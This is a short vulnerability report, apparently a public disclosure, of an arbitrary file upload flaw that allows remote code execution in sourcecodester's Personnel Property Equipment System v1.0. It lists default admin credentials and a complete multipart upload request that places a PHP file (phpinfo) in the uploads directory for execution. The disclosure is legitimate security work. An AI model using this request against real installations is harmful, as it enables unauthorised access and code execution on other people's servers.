# Personnel Property Equipment System v1.0 by sourcecodester has arbitrary code execution (RCE)

BUG_Author: Zhang Qi

vendors: https://www.sourcecodester.com/php/11255/personel-property-equipment-system.html

The program is built using the xmapp-php8.1 version

Login account: Jonremus/admin (Super Admin account)

Vulnerability url: ip/ppes/admin/admin_change_picture.php

Loophole location: arbitrary file upload exists in Personnel Property Equipment System file (RCE).

Request package for file upload：

```sql
POST /ppes/admin/admin_pic.php HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.88/ppes/admin/admin_change_picture.php
Cookie: PHPSESSID=1lo81k0mv3p5cfonn5hopvoht6
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------248131308624445
Content-Length: 315

-----------------------------248131308624445
Content-Disposition: form-data; name="image"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo();
-----------------------------248131308624445
Content-Disposition: form-data; name="change"


-----------------------------248131308624445--
```

The files will be uploaded to this directory \ppes\admin\uploads
<img width="679" height="260" alt="image" src="https://github.com/user-attachments/assets/83ed4247-9671-4955-b74d-386bdde9413a" />


We visited the directory of the file in the browser and found that the code had been executed
<img width="1056" height="467" alt="image" src="https://github.com/user-attachments/assets/3cefb5ca-9a2b-4e0a-84c6-0c39dbad8ceb" />
